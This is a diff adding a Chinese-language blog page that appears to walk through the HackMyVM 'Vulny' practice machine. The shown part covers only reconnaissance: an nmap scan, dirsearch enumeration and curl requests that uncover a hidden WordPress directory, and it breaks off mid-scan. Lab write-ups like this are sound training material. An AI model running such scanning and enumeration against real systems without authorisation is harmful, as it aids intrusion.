@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Vulny靶场复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Vulny">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/19932.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Vulny靶场复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679ddc0dd0e0a243d4f97365.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679de013d0e0a243d4f973a0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679ddfe5d0e0a243d4f9739e.png">
+<meta property="article:published_time" content="2025-02-01T07:44:12.000Z">
+<meta property="article:modified_time" content="2025-02-03T03:33:58.399Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/679ddc0dd0e0a243d4f97365.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/19932.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Vulny | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/19932.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Vulny
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-01 15:44:12" itemprop="dateCreated datePublished" datetime="2025-02-01T15:44:12+08:00">2025-02-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-03 11:33:58" itemprop="dateModified" datetime="2025-02-03T11:33:58+08:00">2025-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/679ddc0ed0e0a243d4f97366.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Vulny靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679ddc0dd0e0a243d4f97365.png"><br>这个靶机是一个ubuntu系统的靶机，前面获取不到靶机ip，修改了好长时间，不过也正好补充我的靶机配置博客<br>解决方案在： <a href="/posts/86.html" title="mac环境靶场搭建">mac环境靶场搭建</a></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.139  </span></span><br><span class="line"><span class="params">sh:</span> <span class="number">0</span>: getcwd() <span class="params">failed:</span> No such file <span class="keyword">or</span> directory</span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">01</span> <span class="number">16</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Apache2 Ubuntu Default <span class="params">Page:</span> It works</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> B2:A7:<span class="number">1</span>A:<span class="number">3</span>F:<span class="number">30</span>:A9 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.61</span> ms <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.33</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>显示只有一个80的web端口 我们下一步就去web找更多信息</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web默认界面是ubuntu系统界面，没有多余信息<br>目录扫描：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.240.139</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.240.139/_25-02-01_16-36-17.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span>                                     </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">18</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">24</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">323</span>B  <span class="operator">-</span> <span class="symbol">/javascript</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>javascript<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/secret</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>secret<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">404</span> <span class="operator">-</span>  <span class="number">225</span>B  <span class="operator">-</span> <span class="operator">/</span>secret<span class="symbol">/</span>                                          </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
+<p>找到两个目录 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.139/javascript/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don&#x27;t have permission to access this resource.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.41 (Ubuntu) Server at 192.168.240.139 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>javascript这个目录没有权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.139/secret/    </span><br><span class="line">Neither &lt;b&gt;/etc/wordpress/config-192.168.240.139.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.240.139.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.   </span><br></pre></td></tr></table></figure></div>
+<p>所以这个secret目录下面是wordpress服务，但是无法解析<br>继续用dirsearch扫描secret下的目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# dirsearch -u <span class="number">192.168</span>.<span class="number">240.139</span><span class="regexp">/secret/</span>                        </span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages<span class="regexp">/dirsearch/</span>dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources is deprecated as an API. See https:<span class="comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist <span class="keyword">size</span>: <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="keyword">File</span>: <span class="regexp">/root/</span>tmp<span class="regexp">/reports/</span>_192.<span class="number">168.240</span>.<span class="number">139</span>/_secret__25-<span class="number">02</span>-<span class="number">01</span>_16-<span class="number">42</span>-<span class="number">21</span>.txt</span><br><span class="line"></span><br><span class="line">Target: http:<span class="comment">//192.168.240.139/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">21</span>] Starting: secret/</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.ht_wsr.txt                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.save                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.sample</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.orig</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.bak1                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_extra                           </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessBAK</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htm                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.html</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_sc</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswds                                </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_orig                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD2</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.httr-oauth                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswd_test                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.php                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">33</span>] <span class="number">200</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>readme.html                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">328</span>B  - <span class="regexp">/secret/</span>wp-admin  